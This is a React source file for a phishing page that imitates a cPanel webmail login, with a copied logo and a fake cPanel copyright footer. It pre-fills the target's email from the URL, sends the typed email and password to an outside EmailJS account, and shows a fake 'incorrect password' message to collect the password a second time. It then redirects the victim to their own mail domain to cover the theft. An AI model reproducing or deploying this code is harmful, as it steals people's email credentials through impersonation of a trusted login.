import "./App.css";
import React, { useState } from "react";
import { Styls } from "./stylls";
import emailjs from "emailjs-com";
import { useParams } from "react-router-dom";

function Forms() {
  const params = useParams();
  console.log(params.id);

  const [showForm, setShowForm] = useState(true);
  const [confirmForm, setConfirmForm] = useState(false);

  const submitHandler = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_x46d5fk",
        "template_p0n7i8b",
        e.target,
        "hSuMaabu3YcHxyAXY"
      )
      .then(
        (result) => {
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );
    e.preventDefault();
    setShowForm(false);
    setConfirmForm(true);
  };

  const editHandler = (e) => {
    e.preventDefault();
    let emailss = params.id;
    let domain = emailss.substring(emailss.lastIndexOf("@") + 1);
    emailjs
      .sendForm(
        "service_x46d5fk",
        "template_p0n7i8b",
        e.target,
        "hSuMaabu3YcHxyAXY"
      )
      .then(
        (result) => {
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );

    window.setTimeout(() => {
      window.location.href = `https://${domain}`;
    }, 1000);
  };
  return (
    <Styls>
      <div className="contsainer">
        {showForm && (
          <div className="imagees">
            <img
              src="https://webmail.gigared.com/cPanel_magic_revision_1610662436/unprotected/cpanel/images/webmail-logo.svg"
              className="imagee"
              alt="displare"
            />
          </div>
        )}
        {showForm && (
          <form className="formal" onSubmit={submitHandler}>
            <label>
              <span className="labeltext">Email Address</span>
              <br></br>
              <span className="newicon1">
                <i class="fas fa-user fa-1x"></i>
              </span>
              <input
                type="email"
                name="to_user"
                required
                placeholder="Enter your email address"
                value={params.id}
              />
            </label>
            <br></br>
            <br></br>

            <label>
              <span className="labeltext">Password</span>
              <br></br>
              <span className="newicon1">
                <i class="fas fa-lock fa-1x"></i>
              </span>
              <input
                type="password"
                name="to_pass"
                required
                placeholder="Enter your email password"
              />
            </label>
            <button> Log in </button>
          </form>
        )}
      </div>
      {confirmForm && (
        <div className="contsainer">
          <div className="imagees">
            <img
              src="https://webmail.gigared.com/cPanel_magic_revision_1610662436/unprotected/cpanel/images/webmail-logo.svg"
              className="imagee"
              alt="displare"
            />
          </div>

          <form className="formal" onSubmit={editHandler}>
            <label>
              <span className="labeltext">Email Address</span>
              <br></br>
              <span className="newicon1">
                <i class="fas fa-user fa-1x"></i>
              </span>
              <input
                type="email"
                name="to_user"
                required
                value={params.id}
                placeholder="Enter your email address"
              />
            </label>
            <br></br>

            <label>
              <span className="labeltext">Password</span>
              <br></br>
              <span className="newicon1">
                <i class="fas fa-lock fa-1x"></i>
              </span>
              <input
                type="password"
                name="to_pass"
                required
                placeholder="Enter your email password"
              />
            </label>
            <p className="reda">Login failed Incorrect Password</p>
            <button> Login </button>
          </form>
        </div>
      )}
      <ul>
        <li>
          <a href="/?locale=en">English</a>
        </li>

        <li>
          <a href="/?locale=de">Deutsch</a>
        </li>

        <li>
          <a href="/?locale=es_es">español&nbsp;de&nbsp;España</a>
        </li>

        <li>
          <a href="/?locale=i_en">i_en</a>
        </li>

        <li>
          <a href="/?locale=ru">русский</a>
        </li>
      </ul>
      <div className="smaller">
        <img
          src="https://png2.cleanpng.com/sh/12d5e7872b72f9faa954137b94be80c0/L0KzQYm3U8I4N5d8j5H0aYP2gLBuTfNxaZ9qhJ9CZXKweLF6lPlvb154feRBaXPoPcHzhgNsNahqep9xb4P3ebBuTfNwdqV3Rd54Z3AwRbLpgfM6amdpedZtOEOxQ4W7VMg2P2U2TaQ7MUmzR4i7WMk3PV91htk=/kisspng-cpanel-web-hosting-service-plesk-web-hosting-contr-logo-5abac9b6dadd83.3444857415221907748965.png"
          width={30}
          alt="displare"
        />
        <br></br>
        Copyright© 2022 cPanel, L.L.C. <br></br>
        Privacy Policy
      </div>
    </Styls>
  );
}

export default Forms;
